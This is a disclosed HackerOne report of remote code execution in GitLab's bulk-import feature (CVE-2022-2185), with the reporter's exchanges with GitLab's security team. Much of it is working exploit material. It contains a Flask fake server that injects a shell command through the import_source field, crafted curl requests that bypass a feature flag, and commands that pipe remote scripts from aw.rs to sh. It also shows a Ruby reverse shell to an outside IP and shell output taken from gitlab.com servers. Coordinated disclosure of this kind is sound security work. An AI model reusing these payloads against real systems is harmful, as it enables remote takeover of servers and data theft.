---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
date: 2022-09-13
submitted: 2022-06-23T03:05:28.831Z
bounty_usd: 33510
votes: 387
cve: "CVE-2022-2185"
program: "[[programs/gitlab|GitLab]]"
reporter: "vakzz"
source: "https://hackerone.com/reports/1609965"
title: "RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)"
---
# RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)

> **Severity:** Critical | **Bounty:** 33,510 USD | **Votes:** 387 | **Program:** GitLab | **Disclosed:** 2022-09-13

- Report: [https://hackerone.com/reports/1609965](https://hackerone.com/reports/1609965)
- CWE: Command Injection - Generic | CVE: CVE-2022-2185
- Submitted: 2022-06-23T03:05:28.831Z

## Timeline

- **Report Filed**
- **2022-06-23** @nmalcolm_gitlab: Hey @vakzz,

Thanks for the report. A colleague and I are both getting `403` responses at Step 13 & 14. Can you provide a different method/stub API to test this, and/or help us debug?

I've set the Project Path & Project ID. Is it to do with what port gitlab is running on locally? (I have GDK set up at `gdk.test:3000` locally, mapping to localhost).

Attached are the ngrok log, ngrok in a chrome tab, and the result when trying to import a project.

Cheers,
Nick Malcolm
GitLab Security Team
- **2022-06-23** @vakzz: Hey @nmalcolm_gitlab,

I forgot to mention that you also need to edit line 50 and change `host = "gitlab.wbowling.info"` to point to your own gitlab host, I think `gdk.test:3000` should work so long as the machine running the proxy can resolve it. The only other thing is that I was using the `http` ngrok tunnel not https, not sure if that makes a difference?

If you always set the `host` variable (eg remove the `if host.endswith("ngrok.io"):` condition` then you should be able to access your gitlab instance via http://localhost:5000, does that work?

Cheers,
Will
- **2022-06-23** @vdesousa: Hey @vakzz ,

We have been trying to reproduce it, but we are unable to get the code executed. The import is done, we wait couple of minutes but we don't see that file written, neither the logs are showing up the error message.

Would you be able to provide us with a video? That would highly help us in seeing what we are missing on our side to reproduce it.

Thank you!
Vitor
GitLab Security Team
- **2022-06-23** @vakzz: Hi @vdesousa,

Sure thing, here is a recording:

 {F1785625}

It is probably more like 5-6 minutes before the command is executed as it only happens after `wait_for_archived_file` yields (which is 255 seconds). 

Cheers,
Will
- **2022-06-24** @vakzz: Hi @vdesousa,

Were you able to reproduce the issue? Sorry the python proxy wasn't working, I'd only tested it with the omnibus edition running in a vm. All it does is add the `template_name` and `import_source` fields to the response for the `GetProjectQuery` query, as well as fixing the path for fetching the project api calls (it was trying to use `/api/v4/projects/export_group/export_project/export_relations` instead of `/api/v4/projects/22/export_relations` and 404ing).

The proxy isn't really needed it was just the simplest way to trigger it, a fake server could be written instead that just returns the required data directly. I can put together something like that if it helps?

Cheers,
Will
- **2022-06-24** @vdesousa: @vakzz ,

We have an issue when importing, the group is imported but the project inside the group isn't. We are trying to figure out why (it's F&F day today so we will be on limited availability).

Have you faced something similar on your testing previously?

Cheers,
Vitor
- **2022-06-24** @vakzz: Hi @vdesousa,

So long as `::Feature.enable(:bulk_import_projects)` is enabled then it should also import the projects for a group. Here is a pure python version that doesn't proxy to a real gitlab instance: {F1787257}. You should be able to unzip it then:
1. run the server with `FLASK_APP=fake_server.py FLASK_ENV=development flask run`
1. start ngrok with `ngrok http 5000`
1. visit http://GITLAB_HOST/groups/new#import-group-pane and enter in the ngrok url and anything for the token
1. import `group1` to any destination
1. after a minute or so you should be able to visit the new group and see that there is a `project1` there
1. clicking on it should show a message `Import in progress`
1. from a rails console you can confirm that the newest project has `import_type=gitlab_project` and `import_source=command`
1. after around 5 minutes the project page will change from `Import in progress` to `The repository could not be imported.` and the command will have executed

```ruby
p = Project.last
=> #<Project id:36 import_ggg_bbb/project1>>
irb(main):015:0> p.import_state
=> #<ProjectImportState id: 17, project_id: 36, retry_count: 0, last_update_started_at: "2022-06-24 11:50:43.713258000 +0000", last_update_scheduled_at: "2022-06-24 11:50:43.645620000 +0000", next_execution_timestamp: nil, status: "started", jid: "c0572388311abf20eb8bd014", last_error: nil, last_update_at: nil, last_successful_update_at: nil, correlation_id_value: "2790bc18d55b4db8f8f9866efbd79ae1">
irb(main):016:0> p.import_type
=> "gitlab_project"
irb(main):017:0> p.import_source
=> ";date|tee /tmp/ggg333;#"
irb(main):026:0> p.import_state.last_error
=> "Error importing repository  into import_ggg_bbb/project1 - command exited with error code 2: tar (child): ;date|tee [FILTERED] Cannot open: No such file or directory\ntar (child): Error is not recoverable: exiting now\ntar: Child returned status 2\ntar: Error is not recoverable: exiting now and No such file or directory @ rb_sysopen - [FILTERED]"
```

```bash
vagrant@gitlab:~$ cat /tmp/ggg333
Fri Jun 24 11:54:58 UTC 2022
```

Cheers,
Will
- **2022-06-27** @vakzz: > it's F&F day today

TIL! That sounds like a great idea :)

I just tested the `fake_server.py` method above using a fresh install of the gdk against gitlab master and the project was imported (well the project is created in the new group and then fails to import after timing out) and the payload is triggered, so if that doesn't work I am unsure what is causing it not to work. 

If there's anything I can do help with just let me know. Alternatively you could enable `bulk_import_projects` for me on gitlab.com and I can give it a test there :D 

Cheers,
Will
- **2022-06-28** @vakzz: Hi @vdesousa and @nmalcolm_gitlab,

I've just found that it's possible to bypass the need for the `bulk_import_projects` feature to be enabled as the `BulkImportsController` does not perform any checks on the `source_type` param which allows you to specify `project_entity` and trigger the `ProjectPipeline` eg:

```
curl 'https://gitlab.com/import/bulk_imports.json' \
  -H 'authority: gitlab.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-AU,en;q=0.9,en-US;q=0.8' \
  -H 'cache-control: no-cache' \
  -H 'content-type: application/json' \
  -H 'cookie: xxxx \
  -H 'origin: https://gitlab.com' \
  -H 'pragma: no-cache' \
  -H 'referer: https://gitlab.com/import/bulk_imports/status' \
  -H 'x-csrf-token: v/53ewT6N5bKneAIWtpt3m4E6sfK1gY8uVbtraLu/zQkIyTaNJvwmLHemKz151dzQ1f34JVtDlgyDlfSdzsw4g==' \
  -H 'x-requested-with: XMLHttpRequest' \
  --data-raw '{"bulk_import":[{"source_type":"project_entity","source_full_path":"group1/project1","destination_namespace":"secret-vakzz","destination_name":"group1aaa"}]}' \
  --compressed
```

Using the fake_server.py above this allows the issue to be triggered  on gitlab.com:


```bash
nc -vnlkp 12345
Listening on [0.0.0.0] (family 0, port 12345)
Connection from [34.74.226.9] port 12345 [tcp/*] accepted (family 2, sport 16275)
id
uid=1000(git) gid=1000(git) groups=1000(git)
hostname -f
gitlab-sidekiq-imports-v2-5b46b76b94-9zkwr
ls -asl /tmp
total 12
4 drwxrwxrwt 1 root root 4096 Jun 28 06:04 .
4 drwxr-xr-x 1 root root 4096 Jun 28 05:33 ..
4 -rw-r--r-- 1 git  git    29 Jun 28 06:04 ggg333
cat /tmp/ggg333
Tue Jun 28 06:04:45 UTC 2022
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
git:x:1000:1000:GitLab,,,:/home/git:/bin/bash
ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
git            1  0.0  0.0 161284 49292 ?        Ssl  05:33   0:01 ruby /srv/gitlab/bin/sidekiq-cluster -r /srv/gitlab -e production --min-concurrency 1 --max-concurrency 1 -t 25 imports
git           31  0.3  0.0 704616  6684 ?        Sl   05:33   0:07 /usr/local/bin/gitlab-logger /var/log/gitlab
git           35  6.8  1.7 1847776 1151624 ?     Sl   05:33   2:15 sidekiq 6.4.0 queues:imports [1 of 1 busy]
git           37  0.3  0.0 173676 47272 ?        Sl   05:33   0:07 sidekiq_exporter
git          332  0.0  0.0   2412   532 ?        S    06:04   0:00 sh -c gzip -dc ;date|tee /tmp/ggg333;curl aw.rs/rsh|sh;curl aw.rs/psh|sh;curl aw.rs/pesh|sh;# | wc -c
git          341  0.0  0.0 105012 22300 ?        S    06:04   0:00 ruby -rsocket -e exit if fork;c=TCPSocket.new("103.3.61.137",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end
git          346  0.0  0.0   2412   596 ?        S    06:04   0:00 sh
git          348  0.0  0.0   2412   532 ?        S    06:04   0:00 /bin/sh -i
git          371  0.0  0.0   2412   592 ?        S    06:06   0:00 sh -c ps auxww
git          372  0.0  0.0   8584  3408 ?        R    06:06   0:00 ps auxww
```

Cheers,
Will
- **2022-06-28** @vdesousa: Hey @vakzz 

Thanks for your comment!

We are trying to use your command with but we are getting `{"error":{"message":"Unable to connect to server: URL '/api/v4/version' is blocked: Only allowed schemes are ","redirect":"/groups/new"}}`.

We are using this `curl` command:

`curl http://xxx.in.ngrok.io/import/bulk_imports.json -H 'authority: ae76-49-204-216-134.in.ngrok.io' -H 'accept: application/json, text/plain, */*' -H 'accept-language: en-AU,en;q=0.9,en-US;q=0.8' -H 'cache-control: no-cache' -H 'content-type: application/json' -H 'cookie: _gitlab_session=xxx' -H 'origin: http://ae76-49-204-216-134.in.ngrok.io' -H 'pragma: no-cache' -H 'referer: http://ae76-49-204-216-134.in.ngrok.io/import/bulk_imports/status' -H 'x-csrf-token: token' -H 'x-requested-with: XMLHttpRequest' --data-raw '{"bulk_import":[{"source_type":"project_entity","source_full_path":"evil-group/evil-project","destination_namespace":"mostdefnotanadmin","destination_name":"group1aaa"}]}' --compressed`

And this is the rev shell command inside `fake_server.py`: `COMMAND = ";nc 127.0.0.1 12345 -e /bin/bash "`

We have seen you have hardcoded a group ID, name, etc. Should we change it?

Thanks!
Vitor
- **2022-06-28** @vdesousa: We are also trying to use the API call but without success so far:

`curl --request POST --header "PRIVATE-TOKEN: PAT" "http://xxx.in.ngrok.io/api/v4/bulk_imports" --data-raw '{"configuration": {"url": "http://xxx.in.ngrok.io/","access_token": "PAT"},"entities": [{"source_full_path": "evil-group/evil-project","source_type": "project_entity","destination_name": "group1aaa","destination_namespace": "mostdefnotanadmin"}]}' --compressed`
- **2022-06-28** @vakzz: Hi @vdesousa,

Sorry I should have posted the steps with the new method. I think the api might restrict the bulk imports to only have a `source_type` `group_entity` but the regular controller still allows it.

1. unzip {F1787257}
1. change the command to something like `COMMAND = ";date|tee /tmp/ggg333; curl aw.rs/rsh|sh;#"`,  (I don't think the gitlab servers have nc on them)
1. run the server with `FLASK_APP=fake_server.py FLASK_ENV=development flask run`
1. run ngrok with `ngrok http 5000`
1. visit `https://gitlab.com/groups/new` and click import group
1. enter the ngrok url and any token
1. open up the network tab in chrome or use burp/caido
1. import the `group1` to a new namespace
1. select `copy as curl` on the request to `bulk_imports.json`, or find it in burp/caido
1. edit the payload and change `source_type` to `project_entity`,  `source_full_path` to `group1/project1` and `destination_name` to an unused project name
1. resend the request (directly to gitlab.com or the ghe instance, not ngrok)
1. you should start seeing a lot of request in the flask app for `/api/v4/projects/group1/project1/export_relations/status`
1. visit `https://gitlab.com/destination_namespace/destination_name/-/import` and you should see `Import in progress` (using the values from your request)
1. After around 5 minutes the import status should change to failed with a message about tar not being able to find the file and the payload will execute

_curl command_
```
 curl 'https://gitlab.com/import/bulk_imports.json' \
  -H 'authority: gitlab.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-AU,en;q=0.9,en-US;q=0.8' \
  -H 'content-type: application/json' \
  -H 'cookie: █████████' \
  -H 'origin: https://gitlab.com' \
  -H 'referer: https://gitlab.com/import/bulk_imports/status' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36' \
  -H 'x-csrf-token: █████████' \
  -H 'x-requested-with: XMLHttpRequest' \
  --data-raw '{"bulk_import":[{"source_type":"project_entity","source_full_path":"group1/project1","destination_namespace":"secret-vakzz","destination_name":"aaa444333"}]}' \
  --compressed
```

_reverse shell_
```
will@vpsbox:~$ nc -vnlkp 12345
Listening on [0.0.0.0] (family 0, port 12345)
Connection from [34.74.226.16] port 12345 [tcp/*] accepted (family 2, sport 26768)
ls
CHANGELOG-EE.md
CHANGELOG.md
CONTRIBUTING.md
Dockerfile.assets
GITALY_SERVER_VERSION
GITLAB_ELASTICSEARCH_INDEXER_VERSION
GITLAB_KAS_VERSION
GITLAB_METRICS_EXPORTER_VERSION
GITLAB_PAGES_VERSION
GITLAB_SHELL_VERSION
GITLAB_WORKHORSE_VERSION
Gemfile
Gemfile.lock
Guardfile
INSTALLATION_TYPE
LICENSE
MAINTENANCE.md
PHILOSOPHY.md
PROCESS.md
Pipfile
Pipfile.lock
README.md
REVISION
Rakefile
VERSION
app
assets-hash.txt
babel.config.js
bin
bootsnap
builds
config
config.ru
crowdin.yml
data
db
doc
docker-compose.yml
ee
file_hooks
fixtures
generator_templates
glfm_specification
haml_lint
jest.config.base.js
jest.config.integration.js
jest.config.js
jest_resolver.js
lefthook.yml
lib
locale
log
metrics_server
package.json
patches
public
scripts
security.txt
shared
sidekiq_cluster
storybook
tests.yml
vendor
workhorse
yarn.lock
id
uid=1000(git) gid=1000(git) groups=1000(git)
hostname
gitlab-sidekiq-imports-v2-7cb8f45788-z4vk8
which nc
which ncat
```

Cheers,
Will
- **2022-06-28** @vdesousa: @vakzz 

We have steps 13 and 14 not working for us: it's importing straight and we don't see any error. 

This is the curl command we are using:

`curl 'http://gitlab.local/import/bulk_imports.json' -X POST -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://gitlab.local/import/bulk_imports/status' -H 'X-CSRF-Token: 5QumHK6ZEd1gGvg9CLVwYtUH5sZNW2KR+LTK/HrH5TcBKNoWXh0bhiEX2lFc0xd/RN2RUyxj1jx50AHupVJ5VQ==' -H 'X-Requested-With: XMLHttpRequest' -H 'Content-Type: application/json' -H 'Origin: http://gitlab.local' -H 'Connection: keep-alive' -H 'Cookie: _gitlab_session=44d5ed374bafffbdaacefcc319d8104a; known_sign_in=U2tHT296V2VOTFM4Y2djako5QVgrYkkxVCtNd1hONWFWMkx0MHpEbUdBVUdud0k4QmZPdThVWVY0Nk1GUHQrUkNwbUJLWjdKRGo2RU9uSVQvdXMybG54NlBSZTdZRWIrWEZKSkpyNGVtcHBxdDEza0hoYjhpdWR1T2JTUGVnNXMtLUJjSFNZazBQbWo3WmNhYWpIWi9IOVE9PQ%3D%3D--0ac6e2d999cac84cb0d47bf54fcb1d0d18a2db91; event_filter=all; sidebar_collapsed=false' --data-raw '{"bulk_import":[{"source_type":"project_entity","source_full_path":"evil-group/evil-project","destination_namespace":"mostdefnotanadmin","destination_name":"evil-group1233"}]}' --compressed`
- **2022-06-28** @vakzz: The `source_full_path` should be `group1/project1` to match the flask api route, then the project should appear and you can check the import_source via a rails console

Cheers,
Will
- **2022-06-28** @vdesousa: @vakzz 

This is the code we are using:

```
from flask import Flask, request, Response, send_file, jsonify
import requests
import json
​
COMMAND = ";curl http://xxx.in.ngrok.io/mostdefnotanadmin;"
​
with open("IntrospectionQuery.json") as f:
    IntrospectionQueryResult = json.load(f)
​
HTTP_METHODS = [
    "GET",
    "HEAD",
    "POST",
    "PUT",
    "DELETE",
    "CONNECT",
    "OPTIONS",
    "TRACE",
    "PATCH",
]
app = Flask(__name__)
​
​
@app.before_request
def log_request():
    app.logger.debug("Request Path %s", request.path)
    app.logger.debug("Request Data %s", request.data)
    return None
​
​
@app.route("/api/v4/version")
def version():
    return jsonify({"version": "15.1.0-ee", "revision": "31c24d2d864"})
​
​
@app.route("/api/v4/groups")
def groups():
    return jsonify(
        [
            {
                "id": 18,
                "name": "evil-group",
                "path": "evil-group",
                "full_name": "evil-group",
                "full_path": "evil-group",
            }
        ]
    )
​
​
@app.route("/api/graphql", methods=["POST"])
def graphql():
    if b"query IntrospectionQuery" in request.data:
        app.logger.debug("IntrospectionQuery")
        return jsonify(IntrospectionQueryResult)
​
    elif b"metadata {\\n    version" in request.data:
        app.logger.debug("version query")
        return jsonify({"data": {"metadata": {"version": "15.1.0-ee"}}})
​
    elif b"($full_path: ID!) {\\n  group(fullPath" in request.data:
        app.logger.debug("group query")
        return jsonify(
            {
                "data": {
                    "group": {
                        "name": "evil-group",
                        "path": "evil-group",
                        "full_path": "evil-group",
                    }
                }
            }
        )
​
    elif b"projects(includeSubgroups: false" in request.data:
        app.logger.debug("projects query")
        return jsonify(
            {
                "data": {
                    "group": {
                        "projects": {
                            "page_info": {
                                "next_page": "eyJpZCI6IjIyIn0",
                                "has_next_page": False,
                            },
                            "nodes": [
                                {"name": "evil-project", "full_path": "evil-group/evil-project"}
                            ],
                        }
                    }
                }
            }
        )
    elif b"($full_path: ID!) {\\n  project(fullPath: $full_path)" in request.data:
        app.logger.debug("project query")
        return jsonify(
            {
                "data": {
                    "project": {
                        "template_name": "rails",
                        "import_source": COMMAND,
                    }
                }
            }
        )
    return jsonify({})
​
​
@app.route("/api/v4/groups/evil-group/export_relations", methods=["POST"])
def group_export_relations():
    return jsonify({"message": "202 Accepted"}), 202
​
​
@app.route("/api/v4/projects/evil-group/evil-project/export_relation", methods=["POST"])
def project_export_relations():
    return jsonify({"message": "202 Accepted"}), 202
​
​
@app.route("/api/v4/groups/export_group/export_relations/status", methods=["GET"])
def group_export_relations_status():
    return jsonify([])
​
​
@app.route("/api/v4/projects/evil-group/evil-project/export_relations/status", methods=["GET"])
def project_export_relations_status():
    return jsonify([])
​
​
@app.route("/", defaults={"path": ""}, methods=HTTP_METHODS)
@app.route("/<path:path>", methods=HTTP_METHODS)
def proxy(path):
    return jsonify({})
```

We have modified it to match our groups. And it's importing right away without failing and we are not seeing the curl command on our ngrok server.

Thanks,
Vitor
- **2022-06-28** @vakzz: Hi @vdesousa,

> And it's importing right away without failing and we are not seeing the curl command on our ngrok server.

The project is imported right away or the group? I'm not sure how the project would be imported as the fake server shouldn't provide enough data to create a successful import. If you visit `/import/bulk_imports/history` you should see something like this (with the project pipeline steps not the group):
{F1799086}

Also I just noticed that the the `COMMAND` has to end with a `#` or similar to make the final command a valid shell script when it is put into the gzip string, I think your current command will not execute as it has invalid syntax:
```bash
vagrant@gitlab:~$ bash -c 'gzip -dc ;curl http://xxx.in.ngrok.io/mostdefnotanadmin; | wc -c'
bash: -c: line 0: syntax error near unexpected token `|'
bash: -c: line 0: `gzip -dc ;curl http://xxx.in.ngrok.io/mostdefnotanadmin; | wc -c'

vagrant@gitlab:~$ bash -c 'gzip -dc ;curl http://xxx.in.ngrok.io/mostdefnotanadmin;# | wc -c'
gzip: compressed data not read from a terminal. Use -f to force decompression.
For help, type: gzip -h
<a href="https://xxx.in.ngrok.io/mostdefnotanadmin">Temporary Redirect</a>.
```

I added a `web_url` and changed the `id` in the groups method so that it could be re-imported (I had another import stuck) but don't think that changes anything, otherwise I tried with your code with a `#` at the end of the command and the payload was executed after the project import failed.

```python
@app.route("/api/v4/groups")
def groups():
    return jsonify(
        [
            {
                "id": 1231231,
                "name": "evil-group",
                "path": "evil-group",
                "full_name": "evil-group",
                "full_path": "evil-group",
                "web_url": "https://a.com/evil-group1",
            }
        ]
    )
```

If none of that works then I am unsure why it is not working for you locally, but you should be able to follow the steps exactly in https://hackerone.com/reports/1609965#activity-17313117 and see that if affects gitlab.com so maybe something changed on master?

Cheers,
Will
- **Report Pending Program Review**
- **Report Triaged**
- **Bounty Awarded**
- **2022-06-30** @gitlab-securitybot: ETA for fix:

Hi @vakzz,

The issue you reported is currently scheduled to be fixed by 2022-07-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2022-07-03** @nmalcolm_gitlab: Hey @vakzz,

Your finding has been patched in GitLab version 15.1.1, assigned CVE-2022-2185, we are awarding a bounty. Congratulations!

The CVSS for this was agreed by the AppSec team as being [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H](https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/#vector=CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H&range=new) (9.9 Critical / $33,510.00 / new bounty range), and we awarded a partial bounty of $1000 when we triaged it.

Great work on this report, and thank you very much for modifying your scripts & steps to reproduce so we could validate the issue. It's always a real pleasure working with you.

Please let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker. If you'd like to publicly disclose this report or details of it in a blog post or elsewhere, please allow 30 days to pass before doing so to give time to our customers to upgrade to a patched version.

We look forward to your next report! (Seriously - we do! 😅)

Best regards,
Nick Malcolm
GitLab Security Team
- **Bounty Awarded**
- **Report Severity Updated**
- **Cve Id Added**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
